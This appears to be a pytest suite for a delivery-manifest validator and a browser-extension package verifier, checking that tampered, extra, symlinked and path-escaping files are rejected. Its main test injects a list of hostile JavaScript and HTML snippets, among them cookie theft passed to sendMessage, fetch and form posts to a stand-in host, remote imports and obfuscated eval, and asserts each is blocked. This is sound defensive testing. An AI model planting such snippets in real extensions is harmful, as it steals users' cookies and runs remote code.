import hashlib
import json
from pathlib import Path

import pytest


def test_delivery_rejects_changed_extra_and_aliased_files(tmp_path: Path) -> None:
    from tools.package_part_b import validate_delivery

    payload = tmp_path / "payload"
    payload.mkdir()
    (payload / "app.js").write_bytes(b"source")
    record = {
        "schema_version": "part-b-delivery/v1",
        "source_commit": "a" * 40,
        "model_enabled": False,
        "money_ready": False,
        "files": {"app.js": {"sha256": hashlib.sha256(b"source").hexdigest(), "size_bytes": 6}},
    }
    (payload / "DELIVERY_MANIFEST.json").write_text(json.dumps(record))
    assert validate_delivery(payload) == record
    (payload / "app.js").write_bytes(b"changed")
    with pytest.raises(ValueError, match="E_DELIVERY"):
        validate_delivery(payload)
    (payload / "app.js").write_bytes(b"source")
    (payload / "unexpected").write_text("extra")
    with pytest.raises(ValueError, match="E_DELIVERY"):
        validate_delivery(payload)
    (payload / "unexpected").unlink()
    (payload / "alias").symlink_to(payload / "app.js")
    with pytest.raises(ValueError, match="E_DELIVERY"):
        validate_delivery(payload)


def test_delivery_paths_cannot_escape_or_hide_case_collisions(tmp_path: Path) -> None:
    from tools.package_part_b import validate_delivery

    (tmp_path / "DELIVERY_MANIFEST.json").write_text(
        json.dumps(
            {
                "schema_version": "part-b-delivery/v1",
                "source_commit": "a" * 40,
                "model_enabled": False,
                "money_ready": False,
                "files": {"../secret": {"sha256": "a" * 64, "size_bytes": 0}},
            }
        )
    )
    with pytest.raises(ValueError, match="E_DELIVERY"):
        validate_delivery(tmp_path)


def test_canonical_extension_rejects_unlisted_capabilities_and_packaged_faults(
    tmp_path: Path,
) -> None:
    from tools.qualify_live_platform import build_live_extension
    from tools.verify_live_package import verify_live_package

    extension, _ = build_live_extension(tmp_path / "build")
    original = {
        p.relative_to(extension).as_posix(): p.read_bytes()
        for p in extension.rglob("*")
        if p.is_file()
    }
    boundary = verify_live_package(extension)
    assert boundary["result"] == "PASS"
    assert boundary["scope"] == "STATIC_PACKAGE_BOUNDARY_ONLY"
    assert boundary["independent_review"] == "NOT_INFERRED"
    assert len(boundary["files"]) == 18
    attacks = [
        ("src/live/background.js", b"\nchrome.debugger.sendCommand({},'Runtime.evaluate',{});"),
        ("src/live/capture.js", b"\nconst execute=chrome.scripting.executeScript;"),
        ("src/live/transport.js", b"\nnew WebSocket('wss://untrusted.invalid');"),
        ("src/live/dom_reader.js", b"\ndocument.cookie;"),
        ("src/live/dom_reader.js", b"\nconst steal=globalThis['fetch'];"),
        ("src/live/dom_reader.js", b"\ndocument.body.innerHTML='TEST_ONLY_MUTATION';"),
        (
            "src/live/dom_reader.js",
            b"\nconst node=document.querySelector('div');node['append'+'Child'](node);",
        ),
        ("src/live/dom_reader.js", b"\naddEventListener('message',()=>{});"),
        (
            "src/live/dom_reader.js",
            b"\nconst {cookie:leak}=document.querySelector('body').ownerDocument;"
            b"chrome.runtime.sendMessage({leak});",
        ),
        (
            "src/live/dom_reader.js",
            b"\nconst node=document.querySelector('body');"
            b"const {setAttribute:mutate}=node;mutate.call(node,'data-mutated','yes');",
        ),
        (
            "src/live/panel.js",
            b"\nwindow['chrome']['tabs']['create']({url:'https://untrusted.invalid/'});",
        ),
        ("src/live/panel.js", b"\nwindow.chrome.tabs.create({url:'https://untrusted.invalid/'});"),
        ("src/live/panel.js", b"\nwindow['localStorage'].setItem('ticket','TEST_ONLY');"),
        (
            "src/live/panel.js",
            b"\nconst {localStorage:store}=window;store.setItem('ticket','TEST_ONLY');",
        ),
        ("src/live/panel.js", b"\ndocument.defaultView.fetch('https://untrusted.invalid/');"),
        (
            "src/live/panel.js",
            b"\nconst {defaultView:view}=document.querySelector('body').ownerDocument;",
        ),
        (
            "src/live/panel.js",
            b"\nconst execute=[]['flat']['con'+'structor']('return this');execute();",
        ),
        ("src/live/panel.js", b"\nnew RTCPeerConnection({});"),
        ("src/live/dom_reader.js", b"\ncookieStore.getAll();"),
        ("src/live/dom_reader.js", b"\ndocument.querySelector('body').textContent++;"),
        (
            "src/live/dom_reader.js",
            b"\nconst nodes=document.querySelector('body');const key='ownerDocument';"
            b"const values=nodes[key];const name='cookie';"
            b"chrome.runtime.sendMessage({leak:values[name]});",
        ),
        (
            "src/live/panel.js",
            b"\nconst d='ownerDocument',v='defaultView',c='chrome';"
            b"const g=document.querySelector('body')[d][v];g[c].tabs.create({url:'https://untrusted.invalid/'});",
        ),
        (
            "src/live/dom_reader.js",
            b"\nfunction leak(nodes,key){return nodes[key];}"
            b"leak(document.querySelector('body'),'cookie');",
        ),
        (
            "src/live/panel.js",
            b"\nfunction leak(node,key){return node[key];}"
            b"leak(document.querySelector('body'),'ownerDocument');",
        ),
        ("src/canonicalize.js", b"\nimport 'https://untrusted.invalid/code.js';"),
        ("src/canonicalize.js", b"\nimport(name);"),
        ("live-validators.js", b"\nfetch('https://untrusted.invalid');"),
        ("src/live/panel.html", b'<img src="https://untrusted.invalid">'),
        (
            "src/live/panel.html",
            b'<form action="https://untrusted.invalid/"><input name="ticket"></form>',
        ),
        (
            "src/live/panel.html",
            b'<meta http-equiv="refresh" content="0;url=https://untrusted.invalid/">',
        ),
    ]
    accepted = []
    for name, attack in attacks:
        path = extension / name
        path.write_bytes(original[name] + attack)
        try:
            try:
                verify_live_package(extension)
            except ValueError as error:
                assert "E_LIVE_PACKAGE" in str(error)
            else:
                accepted.append((name, attack.decode()))
        finally:
            path.write_bytes(original[name])
    assert not accepted, f"Unblocked parser-only mutations: {accepted}"
    capture = extension / "src/live/capture.js"
    capture.write_bytes(
        original["src/live/capture.js"].replace(b'world: "ISOLATED"', b'world: "MAIN"')
    )
    with pytest.raises(ValueError, match="SCRIPT_TARGET"):
        verify_live_package(extension)
    capture.write_bytes(original["src/live/capture.js"])
    extra = extension / "test-harness.js"
    extra.write_text("TEST_ONLY_FAULT;")
    with pytest.raises(ValueError, match="INVENTORY"):
        verify_live_package(extension)
    extra.unlink()
    extra.symlink_to(capture)
    with pytest.raises(ValueError, match="PATH"):
        verify_live_package(extension)
    extra.unlink()
    manifest = extension / "manifest.json"
    data = json.loads(manifest.read_bytes())
    data["permissions"].append("debugger")
    manifest.write_text(json.dumps(data))
    with pytest.raises(ValueError, match="MANIFEST"):
        verify_live_package(extension)
